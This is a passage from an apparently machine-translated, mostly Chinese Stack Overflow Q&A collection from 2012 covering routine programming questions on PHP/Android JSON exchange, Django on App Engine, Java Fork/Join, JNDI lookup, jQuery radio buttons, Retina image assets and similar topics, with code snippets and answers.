我想根据包含字段 DATA_TYPE 和 DATA_CONTENT 的 MySQL 表 DATA 检查这些值中的每一个，它们分别将数据标识为电话号码/电子邮件地址/其他项目，并包含数据。我认为最好将数组加载到 PHP 中，然后遍历它们的每个值以查看查询是否返回记录。如果是这样，那么我想将 DATA 中与具有该电话号码/电子邮件地址的用户关联的所有其他数据构建到 Android 的 JSON 响应中，稍后它将用于将数据复制到自己的 SQLite DB 中。

不过，我不确定如何最好地处理 PHP 的输入和输出。我看到的大多数示例都涉及使用 HTTPPOST 将 NameValuePairs 设置为实体，但这些示例似乎也仅将这些用作从单个记录中识别或复制数据的参数，例如用于登录，而我想传递大量相同的数据类型（电子邮件/电话）用于识别大量记录。我认为可能是将键指定为 "email[1]","someone@somewhere.com" "email[2]","another@s​​omewhere.com" 但由于我是 PHP 新手，所以我是不确定这会有多有效，尤其是在有 100 个左右的地址时。在我的新狂暴中，我会很感激一些指导，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T07:47:22.943

首先，如果你需要传递大量数据，不管格式如何，都会很慢。“太慢”有多慢取决于您的特定应用程序及其要求。`AsyncTask`您应该在一个或另一个非 UI 线程中执行所有 HTTP 通信，以保持 UI 响应。显示进度对话框，即使是不确定的，也是向用户显示正在发生的事情的好方法。

现在，针对您的具体问题。我建议创建一个字符串的 JSON 数组来检查。这基本上会给你一个包含所有数据的字符串。将此字符串设置为`NameValuePair`具有您想要的任何名称的 a 的值，并将此 NameValuePair 作为 HTTP Post 实体传递给您的服务器。然后在您的 PHP 中，您可以简单地执行以下操作：`$valuesToCheck = json_decode($_POST['name'])`- 您的`$valuesToCheck`变量中有一个数组。

现在您可以在 PHP 中做任何您需要做的事情并在 PHP 中获取数据，例如，您可以得到一个数组数组，例如`$dataToSend`一个数组，其中每个元素都是调用的结果`mysql_fetch_assoc`- 或任何其他方式. 获得这些数据后，只需在 PHP 中执行此操作：

```
header("Content-type: text/json");
echo json_encode($dataToSend); 
```

这会将您的所有数据发送回您的调用代码（在本例中为 Android）。最后，在 Android 中，获取响应并对其进行 JSON 解码。如果您返回一个空数组，则数据库中没有匹配项。如果数组不为空，那么您将获得数据并使用它做任何您需要的事情。

有很多博客/教程/等。在网上关于在 Android 中编码/解码 JSON。例如，你可以参考[这个](http://www.hdelossantos.com/2009/12/24/quick-and-easy-android-http-post-of-json-string/)。

# django - 在 Django App Engine 上运行简单的 Django 搜索？

> ID：11553874
> 
> 赞同：1
> 
> 时间：2012-07-19T04:17:01.377
> 
> 标签：django, google-app-engine, django-nonrel

在我的聚合 NBA 球员统计数据的 Django 项目中（作为一个学习项目），我构建了一个简单的搜索视图，允许您按名字或姓氏（或两者）搜索球员。它在开发服务器上运行良好，但现在我想使用 Google App Engine 部署我的网站，并且我收到了我认为是由于 GAE 的高复制数据存储区造成的错误。

我的印象是[Django-nonrel/dbindexer](http://www.allbuttonspressed.com/blog/django/2010/09/Get-SQL-features-on-NoSQL-with-django-dbindexer)工具将有助于缓解这个问题，但到目前为止，我已经尝试实施它们无济于事——当我尝试在我的网站上搜索时，我收到一条带有消息的错误日志：'DatabaseError：数据库不支持此查询。'

我猜我的问题可能是这些工具的说明分散在多个文档中，这些文档是在其开发的不同阶段编写的，因此我很难将它们组合成一张连贯的图片。另外，我查看了他们提供的 testapp，它的设置似乎与他们的说明有所不同。所以我想问两个问题：

1) 我编写的视图是否甚至可以与 GAE 和 Django-nonrel/dbindexer 一起使用？这里是：

```
def search(request):
        query = request.GET.get('q','')
        querywords = query.split(' ')
        lname=''
        for word in querywords[1:-1]:
                lname += word+' '
        lname += querywords[-1]
        if query:
                if len(querywords)>1:
                        qset = (
                                Q(first_name__iexact=querywords[0]) &
                                Q(last_name__iexact=lname) 
                        )
                        exact_results = Player.objects.filter(qset).distinct()
                        if exact_results != []:
                                result = exact_results
                                qset = (
                                        Q(first_name__icontains=querywords[0])|
                                        Q(last_name__icontains=querywords[0])|
                                        Q(first_name__icontains=lname)|
                                        Q(last_name__icontains=lname)   
                                )
                                results = Player.objects.filter(qset).distinct()
                                results = results.order_by('last_name','first_name')
                        else:
                                qset = (
                                        Q(first_name__icontains=querywords[0]) &
                                        Q(last_name__icontains=lname)|
                                        Q(first_name__icontains=querywords[0])|
                                        Q(last_name__icontains=querywords[0])
                                )
                                results = Player.objects.filter(qset).distinct()
                                results = results.order_by('last_name','first_name')
                                result = ''
                else:
                        qset = (
                                Q(first_name__icontains=querywords[0])|
                                Q(last_name__icontains=querywords[0])   
                        )
                        results = Player.objects.filter(qset).distinct()
                        results = results.order_by('last_name','first_name')
                        result = ''
        else:
                results = []
                result = ''
        return render(request,'search.html', {
                'result':result,
                'results': results,
                'query': query,
                'querywords':querywords
        }) 
```

2）如果可以使用，并且我在 dev 中的项目结构如下，我可以遵循哪些最简洁的步骤来使我的搜索视图在 GAE 上正常工作？

```
NBA/
    __init__.py
    manage.py
    settings.py
    urls.py
    templates/
            (html files)
    players/
            __init__.py
            admin.py
            models.py
            tests.py
            views.py
            fixtures/
                    (some .yaml fixture files)
            static/
                    (css, js, and gif files) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T05:07:43.980

通常，不支持 JOIN，因此所有带有 OR 的 Q 对象可能都不起作用。

I haven't used dbindexer much, so I'm not sure how capable it is. I do think if you use it, it will make your datastore queries expensive with all the extra indexing it tries to do automatically.

Even if you're using django-nonrel, you can't expect to port a django app over directly if it uses relational data. You'll have to restructure your data and queries to be non-relational.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-23T05:30:38.723

Ok, so after fiddling around with different kinds of queries using "python manage.py remote shell", I've come to the following conclusions:

1) As @dragonx mentioned, Q objects with "OR" are not supported.

2) However, Q objects with "&" definitely are.

3) The problem with my search view code, other than the "OR" queries, was the addition of "distinct()" in my "Player.objects.filter()" call. Apparently the HRD doesn't support "distinct()", and this was responsible for the cryptic

"DatabaseError: This query is not supported by the database"

message. By contrast, attempting to use a Q object with "OR" gives a much more helpful

"DatabaseError: Only AND filters are supported"

Now that I've removed the "distinct()" bit from my code (and any "OR"-containing Q objects), the search works fine.

# php - Twitter 获取函数

> ID：11553880
> 
> 赞同：0
> 
> 时间：2012-07-19T04:17:48.593
> 
> 标签：php, search, twitter, get

我正在努力完善我的 Twitter 机器人，但我一直被这个困扰我一段时间的问题所困扰。基本上，每当我尝试执行此代码时：

```
<?

$consumerKey    = '------';
$consumerSecret = '------';
$oAuthToken     = '------';
$oAuthSecret     = '------';

include "OAuth.php";
include "twitteroauth.php";

$tweet = new TwitterOAuth($consumerKey, $consumerSecret, $oAuthToken, $oAuthSecret);

    echo "Your message has not been sent to Twitter.";
$twitter->host = "http://search.twitter.com/";
$search = $twitter -> get('search', array('q' => 'pool -table -TowlieBot -#pool :)', 'rpp' => 15));

$twitter->host = "https://api.twitter.com/1/";
foreach($search->results as $tweet) {
    $tweet->post('statuses/update',array('status' => '@'.$tweet->from_user.': Don\'t forget to bring a towel.'));
}
?> 
```

我收到一个**致命错误：在第 16 行调用未定义的方法 stdClass::get()**。

这是我使用的get函数：

```
function get($url, $parameters = array()) {
    $response = $this->oAuthRequest($url, 'GET', $parameters);
    if ($this->format === 'json' && $this->decode_json) {
      return json_decode($response);
    }
    return $response; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:27:00.303

`TwitterOAuth`您正在为您的对象使用两个不同的变量-`$tweet`和`$twitter`. 尝试只选择一个：

```
$twitter = new TwitterOAuth($consumerKey, $consumerSecret, $oAuthToken, $oAuthSecret);

echo "Your message has not been sent to Twitter.";
$twitter->host = "http://search.twitter.com/";
$search = $twitter -> get('search', array('q' => 'pool -table -TowlieBot -#pool :)', 'rpp' => 15)); 
```

# java - Java 7：Fork/Join 示例 - 我做对了吗？

> ID：11553883
> 
> 赞同：1
> 
> 时间：2012-07-19T04:18:03.323
> 
> 标签：java, java-7, fork-join

我正在使用 Java 7 并发和并行功能 - Fork/Join Framework。

我正在尝试显示给定路径下所有目录的列表。有人可以告诉我这是否正确吗？

这是我的主要课程 - 启动任务的 JoinForkExample

```
package com.skilledmonster.examples;

import java.io.File;
import java.util.List;
import java.util.concurrent.ForkJoinPool;

public class JoinForkExample {
    public static void main(String[] args) {
        ForkJoinPool forkJoinPool = new ForkJoinPool() ;
        List<File> directories = forkJoinPool.invoke(new DirectoryListingTask(new File("C:/xampp"))) ;
         for (int i = 0; i < directories.size(); i++) {
            File file = (File) directories.get(i);
            System.out.println(file.getAbsolutePath());
        }
    }
} 
```

这是我的实际任务

```
package com.skilledmonster.examples;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.RecursiveTask;

public class DirectoryListingTask extends RecursiveTask<List<File>> {

    private static final FileFilter filter = new DirectoryFilter();

    private File file ;

    public DirectoryListingTask(File file) {
        this.file = file;
    }

    @Override
    protected List<File> compute() {
       List<RecursiveTask<List<File>>> forks = new LinkedList<>(); 
       List files = new ArrayList();
        if (file.isDirectory()) {
            File[] filteredFiles = file.listFiles(filter);
            if (null != filteredFiles) {
                files.addAll(Arrays.asList(filteredFiles));
            }
            for (File childFile : file.listFiles()) {
                DirectoryListingTask task = new DirectoryListingTask(childFile);
                forks.add(task);
                task.fork();
            }

            for (RecursiveTask<List<File>> task : forks) {
                files.addAll(task.join());
            }
        }
        return files ;
    }
} 
```

我几乎得到了预期的结果。但我不太确定我是否做对了。令人惊讶的是，即使我在不​​使用 join/fork 框架的情况下执行相同的操作，我也没有注意到执行的任何时间差异。

有什么想法吗！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:26:42.177

由于这项工作主要是 IO-bound，所以在这里使用 Fork/Join 并不是很有帮助。我建议改为尝试一些计算密集型任务。另外，请注意 Fork/Join 操作有开销。如果你用它来计算斐波那契数列，它就配不上它。而且我希望性能比顺序版本慢。

# c# - 地理位置 - 它是如何工作的？

> ID：11553884
> 
> 赞同：2
> 
> 时间：2012-07-19T04:18:13.970
> 
> 标签：c#, android, iphone, titanium

示例我得到 6 个移动设备的“纬度”和“经度”GEO 位置：A、B、C、D、E、F（设备是 iphone、ipad、android 等）

现在如何找到设备A范围内10米半径内的所有设备？（只是一个例子）有没有我可以使用的库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:22:56.660

计算A到其他位置的距离，然后过滤掉那些太远的？在 Android 上有[这种有用的方法](http://developer.android.com/reference/android/location/Location.html#distanceTo%28android.location.Location%29)，其他平台上可能存在类似的方法。您也可以始终在您的应用程序中实现基础数学。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T04:26:42.177

至于数学......这个网站有一些关于计算与纬度/经度有关的各种事情的详细信息

[http://www.movable-type.co.uk/scripts/latlong.html](http://www.movable-type.co.uk/scripts/latlong.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:51:51.050

您可以使用以下方法来查找两个经纬度之间的距离，

```
public static float calculateDistance (float lat1, float lng1, float lat2, float lng2 ) 
{
    double earthRadius = 3958.75;
    double dLat = Math.toRadians(lat2-lat1);
    double dLng = Math.toRadians(lng2-lng1);
    double a = Math.sin(dLat/2) * Math.sin(dLat/2) +
    Math.cos(Math.toRadians(lat1)) * Math.cos(Math.toRadians(lat2)) *
    Math.sin(dLng/2) * Math.sin(dLng/2);
    double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    double dist = earthRadius * c;

    int meterConversion = 1609;

    return new Float(dist * meterConversion).floatValue();
} 
```

# gwt - 如何使用 GWT-RPC 以外的方式访问 GWT servlet？

> ID：11553887
> 
> 赞同：0
> 
> 时间：2012-07-19T04:18:25.767
> 
> 标签：gwt, servlets, soap, rpc

是否可以使用 GWT-RPC 以外的协议（例如 AS SOAP）访问 GWT servlet？
如果是，是否需要对它们进行任何更改？
如果没有，我如何手动发出 GWT-RPC 请求并解析服务器响应并将其从 GWT-RPC 转换为任何其他格式（即是否有任何第三方库可以做到这一点）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T07:40:10.477

是的，您可以使用 HttpRequest 使用 GWT-RPC 以外的协议访问 GWT servlet。

[https://developers.google.com/web-toolkit/doc/2.4/DevGuideServerCommunication#DevGuideHttpRequests](https://developers.google.com/web-toolkit/doc/2.4/DevGuideServerCommunication#DevGuideHttpRequests)

以这种方式使用 JSON 是很常见的。教程在这里[https://developers.google.com/web-toolkit/doc/2.4/tutorial/JSON](https://developers.google.com/web-toolkit/doc/2.4/tutorial/JSON)

不过，您需要什么格式？您可以将数据作为对象传回给客户端。如果您不是从 GWT 客户端发出请求，那么您可能不想使用 rpc。

至于 SOAP，看看这里的好讨论 [https://groups.google.com/forum/?fromgroups#!topic/google-web-toolkit/M2KshXZkLUo](https://groups.google.com/forum/?fromgroups#!topic/google-web-toolkit/M2KshXZkLUo)

## 概括

从 GWT 客户端使用 RPC 或 RequestBuilder (HttpRequest)

[http://google-web-toolkit.googlecode.com/svn/javadoc/2.4/com/google/gwt/http/client/package-summary.html](http://google-web-toolkit.googlecode.com/svn/javadoc/2.4/com/google/gwt/http/client/package-summary.html)

如果您需要从非 gwt 客户端调用，那么只需使用 servlet，而不必费心尝试转换返回的 rpc 调用。

# java - 查找中遵循的步骤是什么？什么是第一个 web.xml 或 context.xml？

> ID：11553889
> 
> 赞同：-1
> 
> 时间：2012-07-19T04:18:46.930
> 
> 标签：java, jakarta-ee, tomcat, web.xml, context.xml

查找如何：

```
Context envContext = (Context)initContext.lookup("java:comp/env");
DataSource ds = (DataSource)envContext.lookup("jdbc/MyDatasource"); 
```

继续 ？

我的意思是说如何搜索*名称* `MyDataSource`以及最终返回什么？

添加了两个条目以连接到数据库。其中之一`WEB-INF/web.xml`是：

```
<resource-ref>
<description>my connection</description>
<res-ref-name>jdbc/MyDatasource</res-ref-name>
<res-type>javax.sql.DataSource</res-type>
<res-auth>Container</res-auth> 
```

另一个添加在`META-INF/context.xml`其中的是：

```
<Resource name="jdbc/MyDatasource" auth="Container" type="javax.sql.DataSource"
 driverClassName="org.apache.derby.jdbc.ClientDriver"
 url="jdbc:derby://localhost:1527/My Database;create=true"
 username="me" password="me"
 maxActive="20" maxIdle="10" maxWait="-1" /> 
```

这两个条目如何帮助查找？

首先看什么：`web.xml`或`context.xml`？

请在查找中解释整个过程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T13:47:27.750

资源按以下优先顺序排列：（[通过](http://tomcat.apache.org/tomcat-7.0-doc/jndi-resources-howto.html)`web.xml`元素`<resource-ref>`，，`context.xml`（`server.xml`通过`<GlobalNamingResources>`）。请注意，在您定义的资源`<Context>`实际上并不需要`<resource-ref>`在您的`web.xml`. [.org/tomcat-7.0-doc/jndi-resources-howto.html](http://tomcat.apache.org/tomcat-7.0-doc/jndi-resources-howto.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:47:31.463

以下是进行查找的步骤：
第 1 步：

```
 Context context = new InitialContext(): 
```

初始上下文是对 JNDI 查找服务的引用。它就像 JNDI 虚拟目录树的入口。

第2步：

```
Object o = context.lookup("mejb"): 
```

在查找中，我们需要给出部署在服务器中的任何 bean 的名称，以获取对该 bean 的 home 接口的引用。然后我们获取 java.lang.Object 类型的对象，我们需要强制转换它对我们进行查找的任何 bean 的 Home 接口的对象。

第 3 步：

```
Home home = (Home) PortableRemoteObject.narrow(o,Home.class): 
```

我们实际上需要将对象转换为我们认为它是类型的类型。然而，由于这是基于 IIOP 的 RMI，我们似乎需要使用 PortableRemoteObject.narrow 方法，这似乎将对象类型过滤为实际对象类型并检查错误。

# php - 将平面信息转换为多维数组 PHP

> ID：11553894
> 
> 赞同：0
> 
> 时间：2012-07-19T04:19:51.467
> 
> 标签：php, multidimensional-array

我有一个表格，我从中获取数据，创建一个项目列表。

数据如下所示：

```
Menu1,Header
Menu2,MenuItem
Menu3,MenuItem
Menu4,MenuItem
Menu5,MenuItem
Menu6,Header
Menu7,MenuItem
Menu8,MenuItem
Menu9,MenuItem
Menu10,MenuItem
... 
```

我的数组需要看起来像这样：

```
MenuHeader -> MenuItem
           -> MenuItem
           -> MenuItem

MenuHeader -> MenuItem
           -> MenuItem
           -> MenuItem 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T23:59:28.680

这是一般想法的一些代码。您需要对其进行调整以使用您的数据库和数据。如果可以的话，我建议避免这样做，并调整您的数据库以将 MenuItems 与它们各自的标题相关联。

```
<?php

    $mysqli = new mysqli("localhost", "user","password","database", "3306"); 
    $query = "SELECT id, title, type FROM tbl_name";
    $result = $mysqli->query($query);

    $array1 = array();
    $currentHeading = "undefined";

    while($row = $result->fetch_assoc())
    {
        if($row['type'] == 'MenuHeader') {
            $array1[$row['title']] = array();
            $currentHeading = $row['title'];
        } else {
            $array1[$currentHeading][] = $row['title'];
        }
    }
?> 
```

# linux - 为什么 Pthread Mutexes 不是异步信号安全的？

> ID：11553900
> 
> 赞同：2
> 
> 时间：2012-07-19T04:20:31.043
> 
> 标签：linux, synchronization, pthreads, mutex

Pthread 互斥锁不是异步信号安全的。这是什么意思？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-19T04:24:46.143

这意味着您不能从信号处理程序内部做任何涉及互斥锁的事情。（从技术上讲，仅适用于*异步*信号，但所有*同步*信号都适用于诸如“那个指针不指向任何东西，我现在要杀死你的进程”之类的东西，所以它没有实际意义。）

# ejb - 刷新自动调用persist

> ID：11553901
> 
> 赞同：0
> 
> 时间：2012-07-19T04:20:31.967
> 
> 标签：ejb, ejb-3.0, ejb-3.1

我只是对刷新是否涉及自动保留所有先前的实体关系有一个小疑问。这就是我的意思：

```
shFood.setCuisines(cuisineSelection);
entityManager.flush(); 
```

即使我没有为我的 shFood 指定持久化，为什么 entityManager 会自动持久化我的 shFood 实体以及美食（shFood 与 foodSelection 有级联持久化）实体？

将不胜感激一些澄清！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:52:43.170

在这种情况下，您的 shFood 不是新的实体实例——而是它已经是托管实体。无需为已托管的实体调用persist 以使其托管。该实体保持托管状态，直到托管实体关闭或实体从持久性上下文中分离，例如通过[detach](http://docs.oracle.com/javaee/6/api/javax/persistence/EntityManager.html#detach%28java.lang.Object%29)或[clear](http://docs.oracle.com/javaee/6/api/javax/persistence/EntityManager.html#clear%28%29)。

在你的情况下发生了什么：

1.  在您展示的代码之前的某个地方，您获得了对托管实体实例的引用`shFood`。此实例将保持受管理状态，直到它被分离。
2.  `shFood.setCuisines(cuisineSelection)`改变持久性上下文
3.  `entityManager.flush()`强制实体管理器将对持久性上下文中的实体所做的更改刷新到数据库。对托管实体所做的所有更改都会被刷新。

# cocoa - Cocoa Webview：无法显示 Yahoo 邮件

> ID：11553902
> 
> 赞同：1
> 
> 时间：2012-07-19T04:20:39.067
> 
> 标签：cocoa, webview, yahoo-mail

我已经通过 Google 和 stackoverflow 进行了搜索，但对我的问题一无所知。

我正在帮助用户使用 Cocoa Webview 在我的应用程序中检查他们的 Yahoo 邮件。

在 Yahoo 邮件页面：我可以显示欢迎页面，但是在我输入我的 Yahoo 帐户并单击“登录”后，我被重定向到显示：“您快到了，但是您的网络浏览器不支持最新的雅虎版！邮件”。

在该消息下方是 3 个链接：

*   火狐
*   Internet Explorer（适用于 Windows）
*   苹果浏览器

然后我点击 Safari，但没有任何反应！

我尝试使用 Gmail 和 Facebook 登录，这绝对没问题。

我的 Cocoa Webview 无法加载 Yahoo! 的任何原因 邮件页面？如何解决这个问题？

注意：如果我将 Yahoo 邮件帐户切换回经典模式，则它可以正常工作。（即Cocoa Webview可以显示邮件页面）

提前致谢，

乔什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-07T15:52:50.840

您可以使用 Safari 进行欺骗，以便 Yahoo 认为它正在连接 Safari，这可能会解决它：

```
webViewOutlet.applicationNameForUserAgent = "Version/9.0.3 Safari/601.4.4"; 
```

您可以从以下位置找到最新的字符串：

[http://www.useragentstring.com](http://www.useragentstring.com)

# php - PHP复制时如何发送登录信息

> ID：11553906
> 
> 赞同：2
> 
> 时间：2012-07-19T04:21:11.600
> 
> 标签：php

```
$url1 = 'www.somewebsite.com/somefile.ext';

if (@copy($url1, "somefolder/filename.ext"))
{
echo 'File 1 saved.';
} 
```

当我尝试在没有任何登录权限的情况下复制文件时，此代码运行良好。但是当我尝试复制具有登录权限的文件时，该文件不会被复制。无论如何也要发送登录信息吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T04:44:51.813

通常的方法是在服务器之前在 URL 中编码登录信息。例如：

```
http://user:password@example.com/somefile.txt 
```

记住要考虑安全性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T04:44:00.967

假设登录是基本的 HTTP 登录，您可以使用它[`stream_context_create`](http://www.php.net/manual/en/function.stream-context-create.php)来传递您的详细信息：

```
$cred = sprintf('Authorization: Basic %s', 
      base64_encode($username . ":" . $password) );

$context = stream_context_create(array(
    'http' => array(
        'header'  => $cred
    )
));

$url1 = 'www.somewebsite.com/somefile.ext';

if (@copy($url1, "somefolder/filename.ext", $context))
{
    echo 'File 1 saved.';
} 
```

# c++ - 如何在 Qt 中表示 X11 的“可绘制”

> ID：11553907
> 
> 赞同：1
> 
> 时间：2012-07-19T04:21:17.750
> 
> 标签：c++, qt, qt4

我在 Qt 中使用 3rd 方库。使用 API，我需要将“可绘制”对象传递给它。它提到drawable是一个X Windows Pixmap，假设存在于Display display的X Screen屏幕上

在这种情况下，我需要使用 Qt pixmap 将其作为 drawable 传递给它。我如何做到这一点。请指教。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T07:01:14.980

也许文档可以帮助您： [Qt::HANDLE QPixmap::x11PictureHandle () const](http://doc-snapshot.qt-project.org/4.8/qpixmap.html#x11PictureHandle)

# javascript - 获取选中单选按钮的值

> ID：11553908
> 
> 赞同：4
> 
> 时间：2012-07-19T04:21:31.527
> 
> 标签：javascript, jquery, html, radio-button

我在 HTML 中以如下形式定义了一组单选按钮。我的表格名称是“MyForm”。选择女性时，我希望变量的值等于“女性”。

```
<fieldset data-role="controlgroup" data-type="horizontal" id="gender" name="gender">
                    <legend>Gender :</legend>
  <input type="radio" name="radio-choice-1" id="radio-choice-1" value="choice-1" checked="checked" />
                        <label for="radio-choice-1">Male</label>

 <input type="radio" name="radio-choice-1" id="radio-choice-2" value="choice-2"/>
                        <label for="radio-choice-2">Female</label>
                </fieldset> 
```

我试过作为 var

```
genderValue = $('input[name=gender]:checked', '#MyForm').val() 
```

但这不起作用。正确的方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T04:23:31.543

您可以根据您的标记将值（`female`， ）存储在输入的值属性中，您可以尝试以下操作：`...`

```
$('input[name="radio-choice-1"]').change(function(){
   var genderValue = $(this).next('label').text()
}) 
```

* * *

但我建议这个：

```
<fieldset data-role="controlgroup" data-type="horizontal" id="gender" name="gender">
   <legend>Gender :</legend>
   <input type="radio" name="radio-choice-1" id="radio-choice-1" value="Male" checked="checked" />
   <label for="radio-choice-1">Male</label>
   <input type="radio" name="radio-choice-1" id="radio-choice-2" value="Female"/>
   <label for="radio-choice-2">Female</label>
</fieldset> 
```

```
$('input[name="radio-choice-1"]').change(function(){
   var genderValue = this.value
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T05:55:56.580

您的问题已解决如下：

**HTML：**

```
<form id="MyForm" name="MyForm" method="post">
  <fieldset>
    <legend>
      Gender
    </legend>
    <div id="panel">
      <input type="radio" name="radio-choice" id="radio-choice-1" value="choice-1" />
      <label for="radio-choice-1">
        Male
      </label>
      <input type="radio" name="radio-choice" id="radio-choice-2" value="choice-2" />
      <label for="radio-choice-2">
        Female
      </label>
    </div>
    <div id="result">
    </div>
  </fieldset>
</form> 
```

**jQuery：**

```
$(function() {
    $('input[name="radio-choice"]').change(function() {
        var genderValue = $(this).next('label').text();
        $("#result").html("<p> You have selected " + genderValue + ".");
    })
}); 
```

我已经在[http://codebins.com/bin/4ldqpaa上完成了垃圾箱](http://codebins.com/bin/4ldqpaa)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-07-08T16:15:58.520

这可能对某人有帮助，这是另一种检索选定单选按钮值的方法

```
var gender = $('input[name="radio-choice-1"]:checked').val(); 
```

在这里将 id 设置为单选按钮是可选的。

编码快乐！......

# php - 隐藏在 JavaScript 函数中作为参数传递的元素的父元素

> ID：11553911
> 
> 赞同：0
> 
> 时间：2012-07-19T04:21:59.203
> 
> 标签：php, javascript

我有一个应用程序，我必须在其中显示一个事件的计时器，当事件结束时，该计时器（包含它的块）应该隐藏。我已经为父 div 元素（该块）设置了 CSS，因为计时器元素具有动态 ID（它具有事件的 ID 号以及类名）。

这是 JavaScript 代码：

```
function GetCount(deal_year,deal_month,deal_date,deal_box)
    {
    dateFuture = new Date(deal_year,deal_month,deal_date,00,00,00);

   // alert(dateFuture); return false;

dateNow = new Date();                                   //grab current date
//alert(dateNow);
span = dateFuture.getTime() - dateNow.getTime();  //calc milliseconds between dates
delete dateNow;

// if date has passed
if(span <= 0){

          x=document.getElementById("dealbox");
          x.parentNode.getAttributeNode("style").value="display:none";

         } 
    else { // date is still good
           // convert from milliseconds to hr/m/s...
            // and save them in diff variable(code is long so avoided that)

       document.getElementById(deal_box).innerHTML="<span>"+out+"
  </span><br/><strong>days : hours :  minutes : seconds</strong>";

  setTimeout("GetCount('"+deal_year+"','"+deal_month
                       +"','"+deal_date+"','"+deal_box+"')", 1000); 
```

Ans 这是 php 代码

```
 if(strtotime("now") < strtotime($end_date)) { ?>                      

      <div class ="timer_box" id="timer" style="float:right; display: block;" >

         <b><div id="deal_box<?php echo $id; ?>"></div></b>
      </div>

      <script type="text/javascript">
    GetCount(<?php echo $timer_array[0]; ?>,<?php echo $timer_array[1]-1; ?>,<?php 
 echo $timer_array[2]; ?>,'<?php echo 'deal_box'.$id; ?>','<?php echo 'timer'; ?>');
      </script>  <?php } ?> 
```

我尝试通过使用传递给函数的 DOM 元素的 parentNode 访问来隐藏父块。但它没有用。我怀疑该函数无法通过元素访问父级的 if 。我尝试了每件事，但没有帮助。所以尝试了通过javascript更改元素的类名的解决方法，但仍然认为有更好的方法，因为我是菜鸟，希望错过一些东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:33:05.273

正如您的 php 脚本所示，您有一个后缀为“deal_box”的数字（id），但您只需使用 getElementById("deal_box") 在 javascript 中访问它吗？

我的意思是，你想念身份证吗？通常在两种情况下，您无法设置给定 Dom 的样式： 1，您根本没有通过正确的选择器获得 Dom；2、你的样式设置代码有一些语法问题；

建议您使用 console.log() 或其他函数来跟踪您的代码。

# php - PHP函数打乱javascript代码？

> ID：11553912
> 
> 赞同：1
> 
> 时间：2012-07-19T04:22:20.180
> 
> 标签：php, javascript, scramble

> **可能重复：**
> [如何混淆 JavaScript？](https://stackoverflow.com/questions/194397/how-can-i-obfuscate-javascript)

我想知道是否有一种方法可以移动javascript。所以假设我有一个 javascript 文件。我希望能够让 PHP 函数只移动 JS 函数等，这样它的可读性就会降低。

1.  设置 javascript 文件的路径
2.  读取 JS 文件
3.  抓取每个 JS 函数或 jquery 选择器并移动它们并保存文件。困难的部分是弄清楚如何确保每个代码块都是完整的......嗯......也许使用 2 \n\n 返回作为分隔符？另一个想法是让每个 JS 阻塞一个句子，只使用 PHP 换行？

好奇这是否可行...

谢谢

**更新：你们怎么看这个？在每个函数之间使用 /// 并将所有内容转换为数组，然后我将随机化数组并再次将其输出**

```
<?php
$file_content = file_get_contents("js/js.js");
$content = explode("///", $file_content);
echo count($content);
print_r($content);
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:25:45.467

通过 PHP 不确定，但您可以调整[UglifyJS](https://github.com/mishoo/UglifyJS/)。它具有非常好的 AST 解析，因此您可能应该阅读更多关于 AST（抽象语法树）的内容，它基本上是 javascript 代码的大纲。

绝对可行。

# iphone - 支持 Retina 和非 Retina 显示器的图形

> ID：11553914
> 
> 赞同：2
> 
> 时间：2012-07-19T04:22:28.643
> 
> 标签：iphone, retina-display

我想知道我应该如何继续在视网膜和非视网膜显示器上正确支持图形。我有一个尺寸为 640 * 920 的背景图像，我认为它是用于视网膜显示的。但是我将如何支持尺寸为 320*480 的非 Retina 显示器？您如何构建图形资源？我有一个名为“Art”的组，其中包含所有图形（现在全部用于 Retina 显示尺寸）。

iOS 会自动将我的图形缩小到非 Retina 显示器吗？我还有一个查询，比如我将一个按钮拖到 Retina 显示的某个绝对位置的视图上，它会自动调整到尺寸为 320 * 480 的设备上的适当位置吗？我该如何处理同时支持屏幕尺寸/分辨率？

注意：我正在使用 Xcode 4.3.3 并使用情节提要。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T05:04:13.223

您必须制作每个图像的两个版本。例如，如果您有一个 544x151 的视网膜图像，比如说它的名称为“background@2x.png”，则为非视网膜显示制作一个 272x75 的版本，即“background.png”

使用后缀“@2x.png”命名所有视网膜图像。操作系统会自动在视网膜设备上呈现@2x 图像。所以得出结论：

272x75 将是“background.png” 544x151 将是“background@2x.png”

这也是使图标与视网膜设备兼容的正确方法。只需制作一个 114x114 (iphone) 或 144x144 (ipad) 并将其命名为“icon@2x.png”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T04:30:04.423

您需要使用“@2x.png”后缀命名您的视网膜图像。

